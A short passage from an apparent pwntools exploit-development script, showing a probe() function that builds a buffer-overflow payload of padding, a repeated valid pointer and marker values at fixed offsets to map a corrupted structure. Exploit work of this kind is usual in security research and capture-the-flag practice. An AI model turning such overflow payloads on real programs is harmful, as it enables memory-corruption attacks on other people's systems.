...
def probe():
    ...
    # Payload
    payload = b"A" * 48
    # Off 0 -> data_a (Valid Ptr)
    payload += p64(data_a)
    # Off 8 -> data_a (Valid Ptr)
    payload += p64(data_a)
    # Off 16 -> P16
    payload += p64(0x1616161616161616)
    # Off 24 -> P24
    payload += p64(0x2424242424242424)
    # Off 32 -> P32
    payload += p64(0x3232323232323232)
    # Off 40 -> P40
    payload += p64(0x4040404040404040)
